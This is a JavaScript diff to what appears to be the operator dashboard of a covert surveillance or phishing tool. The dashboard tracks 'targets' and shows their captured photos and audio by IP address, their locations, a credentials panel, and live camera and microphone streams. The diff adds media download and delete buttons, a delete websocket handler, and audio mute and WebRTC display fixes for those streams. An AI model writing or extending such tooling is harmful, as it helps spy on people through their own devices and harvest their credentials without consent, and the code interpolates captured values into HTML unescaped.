@@ -512,6 +512,7 @@ function initWebSocket() {
   ws.on('LOCATION_UPDATE', (msg) => { handleMessage({ type: 'LOCATION_UPDATE', ...msg }); });
   ws.on('NEW_LOG', (msg) => { handleMessage({ type: 'NEW_LOG', ...msg }); });
   ws.on('NEW_MEDIA', (msg) => { handleMessage({ type: 'NEW_MEDIA', ...msg }); });
+  ws.on('DELETE_MEDIA', (msg) => { handleMessage({ type: 'DELETE_MEDIA', ...msg }); });
   ws.on('ACTIVITY', (msg) => { handleMessage({ type: 'ACTIVITY', ...msg }); });
   ws.on('ALERT_SENT', (msg) => { handleMessage({ type: 'ALERT_SENT', ...msg }); });
   ws.on('CAMERA_FRAME', (msg) => { handleMessage({ type: 'CAMERA_FRAME', ...msg }); });
@@ -743,6 +744,14 @@ function handleMessage(msg) {
       break;
     }
 
+    case 'DELETE_MEDIA': {
+      mediaItems = mediaItems.filter(m => m.id !== msg.id);
+      refreshMediaPanel();
+      updateHeaderStats();
+      updateBadge('media', mediaItems.length);
+      break;
+    }
+
     case 'ACTIVITY': {
       addActivityItem(msg.entry);
       break;
@@ -925,8 +934,18 @@ function renderMediaItem(item, prepend) {
     html = `<div class="media-card" id="media-${item.id}">
       <img class="media-card-img" src="${item.data}" alt="Captured photo" onclick="openLightbox('${item.data}')">
       <div class="media-card-meta">
-        <span class="media-badge photo">PHOTO</span>
-        <span>${item.ip} — ${ts}</span>
+        <div style="display:flex;gap:8px;align-items:center;">
+          <span class="media-badge photo">PHOTO</span>
+          <span>${item.ip} — ${ts}</span>
+        </div>
+        <div class="media-actions" style="display:flex;gap:8px;">
+          <button title="Download" onclick="downloadMedia('${item.id}')" style="background:none;border:none;color:var(--text-muted);cursor:pointer;padding:0;">
+            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+          </button>
+          <button title="Delete" onclick="deleteMedia('${item.id}')" style="background:none;border:none;color:#ff4757;cursor:pointer;padding:0;">
+            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
+          </button>
+        </div>
       </div>
     </div>`;
   } else {
@@ -936,8 +955,18 @@ function renderMediaItem(item, prepend) {
         <audio controls src="${item.data}"></audio>
       </div>
       <div class="media-card-meta">
-        <span class="media-badge audio">AUDIO</span>
-        <span>${item.ip} — ${ts}</span>
+        <div style="display:flex;gap:8px;align-items:center;">
+          <span class="media-badge audio">AUDIO</span>
+          <span>${item.ip} — ${ts}</span>
+        </div>
+        <div class="media-actions" style="display:flex;gap:8px;">
+          <button title="Download" onclick="downloadMedia('${item.id}')" style="background:none;border:none;color:var(--text-muted);cursor:pointer;padding:0;">
+            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
+          </button>
+          <button title="Delete" onclick="deleteMedia('${item.id}')" style="background:none;border:none;color:#ff4757;cursor:pointer;padding:0;">
+            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="3 6 5 6 21 6"></polyline><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"></path></svg>
+          </button>
+        </div>
       </div>
     </div>`;
   }
@@ -947,9 +976,34 @@ function renderMediaItem(item, prepend) {
   } else {
     grid.insertAdjacentHTML('beforeend', html);
   }
+}
 
-  document.getElementById('media-count').textContent = `${mediaItems.length} file${mediaItems.length !== 1 ? 's' : ''}`;
-  updateStat('stat-media', mediaItems.length);
+async function deleteMedia(id) {
+  if (!confirm('Are you sure you want to delete this media item?')) return;
+  try {
+    const res = await fetch(`/api/media/${id}`, { method: 'DELETE' });
+    const data = await res.json();
+    if (data.success) {
+      showToast('Media deleted successfully', 'success');
+      // The DOM will update via the DELETE_MEDIA websocket event broadcast by the server
+    } else {
+      showToast('Failed to delete media: ' + (data.message || 'Unknown error'), 'error');
+    }
+  } catch (err) {
+    console.error(err);
+    showToast('Error deleting media', 'error');
+  }
+}
+
+function downloadMedia(id) {
+  const item = mediaItems.find(m => m.id == id);
+  if (!item) return;
+  const a = document.createElement('a');
+  a.href = item.data;
+  a.download = `captured_${item.type}_${item.id}${item.type === 'photo' ? '.jpeg' : '.webm'}`;
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
 }
 
 // ─── Credentials Panel ────────────────────────────────────────────
@@ -1115,10 +1169,9 @@ function refreshCameraGrid() {
               <p class="camera-placeholder-sub">Click <strong>Start Stream</strong> below</p>
             </div>
             <img id="camera-live-img-${cid}" class="camera-live-img" src="" alt="Live camera feed" style="display:none">
-            <video id="camera-live-video-${cid}" autoplay playsinline style="display:none; width: 100%; height: 100%; object-fit: cover;"></video>
+            <video id="camera-live-video-${cid}" autoplay playsinline muted style="display:none; width: 100%; height: 100%; object-fit: cover;"></video>
             <div class="camera-overlay-info" id="camera-overlay-info-${cid}" style="display:none">
               <span class="cam-overlay-rec">● LIVE</span>
-              <span id="cam-overlay-fps-${cid}">0 fps</span>
             </div>
           </div>
 
@@ -1135,12 +1188,7 @@ function refreshCameraGrid() {
                 <button class="camera-facing" id="facing-rear-${cid}" onclick="setCameraFacing(${t.clientId}, 'environment')">📷 Rear</button>
               </div>
             </div>
-            <div class="camera-stat-row">
-              <span class="camera-stat-label">Stream Stats</span>
-              <span class="camera-stat-val">
-                Frames: <span id="cam-frames-${cid}">0</span> | FPS: <span id="cam-fps-${cid}">0</span>
-              </span>
-            </div>
+
           </div>
         </div>
       `;
@@ -1259,19 +1307,24 @@ function receiveCameraFrame(msg) {
   const stream = activeCameraStreams[targetId];
   if (!stream) return; // not listening for this target's frames
 
-  // If WebRTC is currently active and showing video, we might not show frames,
-  // but if WebRTC failed/is disabled, or video is hidden, show the frame in the img tag.
   const video = document.getElementById(`camera-live-video-${targetId}`);
-  const img = document.getElementById(`live-feed-${targetId}`) || document.getElementById(`camera-live-img-${targetId}`);
-  
-  if (img && (!video || video.style.display === 'none')) {
+  const img   = document.getElementById(`live-feed-${targetId}`) || document.getElementById(`camera-live-img-${targetId}`);
+
+  // Show JPEG snapshot unless WebRTC video is actively playing live tracks
+  const webrtcActive = video
+    && video.srcObject
+    && video.srcObject.getVideoTracks().some(t => t.readyState === 'live')
+    && video.readyState >= 2;
+
+  if (img && !webrtcActive) {
     img.src = msg.frame || msg.image || msg.data;
     img.style.display = 'block';
+    if (video) video.style.display = 'none'; // hide empty WebRTC video element
   }
 
   stream.frameCount++;
   stream.fpsCounter++;
-  
+
   const frameCountEl = document.getElementById(`cam-frames-${targetId}`);
   if (frameCountEl) frameCountEl.textContent = stream.frameCount;
 }
@@ -1279,6 +1332,9 @@ function receiveCameraFrame(msg) {
 function receiveAudioChunk(msg) {
   const stream = activeCameraStreams[msg.clientId];
   if (!stream) return; // not listening or active
+  
+  // If we are muted, do not queue audio
+  if (stream.isMuted) return;
 
   stream.audioQueue.push(msg.audio);
   if (!stream.isPlayingAudio) {
@@ -1292,25 +1348,32 @@ function playNextAudioChunk(targetId) {
 
   if (stream.audioQueue.length === 0) {
     stream.isPlayingAudio = false;
+    stream.currentAudio = null;
     return;
   }
 
   stream.isPlayingAudio = true;
   const chunk = stream.audioQueue.shift();
   const audio = new Audio(chunk);
+  
+  // Keep track of the current audio element so we can mute/unmute it on the fly
+  stream.currentAudio = audio;
 
   // Apply muted state immediately
   audio.muted = stream.isMuted;
 
   audio.onended = () => {
+    stream.currentAudio = null;
     playNextAudioChunk(targetId);
   };
   audio.onerror = () => {
+    stream.currentAudio = null;
     playNextAudioChunk(targetId);
   };
 
   audio.play().catch(() => {
     // Autoplay policy or decoding failure, proceed to next chunk
+    stream.currentAudio = null;
     playNextAudioChunk(targetId);
   });
 }
@@ -1322,12 +1385,28 @@ function toggleAudioMute(targetId) {
 
   if (stream) {
     stream.isMuted = !stream.isMuted;
-    btn.textContent = stream.isMuted ? '🔇' : '🔊';
+    // Update the button icon
+    btn.innerHTML = stream.isMuted ? '🔇' : '🔊';
+    btn.title = stream.isMuted ? 'Unmute Audio' : 'Mute Audio';
+    // Mute/unmute the currently playing audio element if any
+    if (stream.currentAudio) {
+      stream.currentAudio.muted = stream.isMuted;
+    }
+    // Mute/unmute the WebRTC video element if playing
+    const video = document.getElementById(`camera-live-video-${targetId}`);
+    if (video) {
+      video.muted = stream.isMuted;
+    }
+    // Clear queued chunks if muting (no point playing stale audio later)
+    if (stream.isMuted) {
+      stream.audioQueue = [];
+      stream.isPlayingAudio = false;
+    }
     addCtrlStatus(`[audio] Target #${targetId} live audio ${stream.isMuted ? 'muted' : 'unmuted'}.`);
   } else {
-    // Handle the visual toggle fallback if not streaming yet
-    const currentlyMuted = btn.textContent === '🔇';
-    btn.textContent = currentlyMuted ? '🔊' : '🔇';
+    const currentlyMuted = btn.innerHTML.includes('🔇');
+    btn.innerHTML = currentlyMuted ? '🔊' : '🔇';
+    btn.title = currentlyMuted ? 'Mute Audio' : 'Unmute Audio';
   }
 }
 
